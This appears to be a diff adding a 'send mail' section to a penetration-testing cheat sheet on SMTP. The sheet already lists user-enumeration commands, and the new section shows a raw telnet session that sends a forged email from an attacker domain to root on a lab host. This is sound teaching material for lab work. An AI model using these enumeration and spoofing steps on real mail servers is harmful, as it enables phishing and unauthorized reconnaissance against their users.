@@ -4,6 +4,7 @@
     * [manually](#manually)
     * [`smtp-user-enum`](#smtp-user-enum)
     * [metasploit `smtp_enum`](#metasploit-smtp_enum)
+  * [send mail](#send-mail)
 
 # SMTP
 Refs
@@ -56,3 +57,18 @@ smtp-user-enum -U usernames.txt -t 192.186.235.3
 > use auxiliary/scanner/smtp/smtp_enum \
 > set RHOSTS 192.186.235.3 \
 > exploit 
+## send mail
+```sh
+telnet 192.186.235.3 25
+HELO attacker.xyz
+MAIL FROM: admin@attacker.xyz
+RCPT TO: root@victim-1
+DATA
+Subject: Hi Root
+Hello,
+This is a fake mail sent using telnet command.
+From,
+Admin
+.
+```
+Note: There is a dot(.) in the last line which indicates the termination of data.
